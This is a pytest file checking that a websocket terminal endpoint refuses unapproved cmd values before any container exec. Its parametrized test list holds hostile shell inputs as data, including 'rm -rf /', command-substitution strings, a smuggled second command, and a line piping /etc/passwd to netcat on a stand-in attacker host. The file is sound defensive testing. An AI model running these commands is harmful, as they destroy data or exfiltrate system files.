"""End-to-end coverage of /ws/pty/{record_id}'s cmd-allowlist gate (M5).

These tests stop *before* the Docker exec — we don't need a real
container to check that the router short-circuits an invalid cmd value.
The handler rejects at handshake time with close code 4400 and the
control frame ``sclosed:cmd-not-allowed:…`` ahead of any registry or
pty lookup.
"""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

from hub.main import app
from hub.tests.conftest import HIVE_TEST_TOKEN


@pytest.mark.parametrize(
    "cmd",
    [
        ";rm -rf /",
        "$(whoami)",
        "`id`",
        "bash; echo pwned",
        "cat /etc/passwd | nc attacker 4444",
        "unknown_binary",
        "/bin/bash",
    ],
)
def test_ws_pty_rejects_bad_cmd(cmd: str) -> None:
    """Malicious or unknown cmd values get a 4400 close before any exec."""
    with (
        TestClient(app) as client,
        client.websocket_connect(f"/ws/pty/999?token={HIVE_TEST_TOKEN}&cmd={cmd}") as ws,
    ):
        msg = ws.receive_text()
        assert msg.startswith("sclosed:cmd-not-allowed")


def test_ws_pty_accepts_known_alias() -> None:
    """A known alias ('bash') passes the cmd gate and proceeds to the
    container-lookup step. record_id=999 isn't registered so the handler
    closes with 4404 (container-not-found) — the point is that the
    close-reason is *not* cmd-not-allowed."""
    with (
        TestClient(app) as client,
        client.websocket_connect(f"/ws/pty/999?token={HIVE_TEST_TOKEN}&cmd=bash") as ws,
    ):
        msg = ws.receive_text()
        assert msg == "sclosed:container-not-found"


def test_ws_pty_default_cmd_is_accepted() -> None:
    """Omitting cmd keeps the pre-M5 default of ``bash`` — still valid."""
    with (
        TestClient(app) as client,
        client.websocket_connect(f"/ws/pty/999?token={HIVE_TEST_TOKEN}") as ws,
    ):
        msg = ws.receive_text()
        assert msg == "sclosed:container-not-found"
